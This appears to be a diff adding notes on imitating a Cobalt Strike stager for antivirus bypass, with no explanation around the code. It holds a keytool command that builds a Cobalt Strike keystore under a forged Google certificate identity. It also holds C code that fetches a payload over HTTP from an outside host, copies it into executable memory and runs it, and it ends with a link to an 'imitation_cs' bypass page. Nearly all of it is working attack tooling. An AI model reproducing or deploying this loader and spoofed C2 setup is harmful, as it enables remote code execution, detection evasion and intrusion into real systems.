@@ -1,0 +1,22 @@
+keytool -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias Google.com -dname "CN=Google, OU=Google IT, O=Google Corporation, L=Mountain View, S=Santa Clara, C=US"
+
+
+#include<Windows.h>
+#include<wininet.h>
+#pragma comment (lib, "wininet.lib")
+int main() {
+	HINTERNET Session = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+	HINTERNET con = InternetConnectA(Session, "192.168.1.7", 80, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
+	HINTERNET Http = HttpOpenRequestA(con, "GET", "/index.html", "HTTP/1.1", NULL, NULL, INTERNET_FLAG_NO_CACHE_WRITE, NULL);
+	HttpSendRequest(Http, NULL, NULL, NULL, NULL);
+	LPVOID a = VirtualAlloc(NULL, 0x400000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	DWORD dwRealWord;
+
+	for (int i = 0; i < 32; i++) {
+		BOOL response = InternetReadFile(Http, (LPVOID)((int)a + i * 0x2000), 0x2000, &dwRealWord);
+	}
+	((void(*)())a)();
+	return 0;
+}
+
+https://www.macchiato.ink/hst/bypassav/imitation_cs/
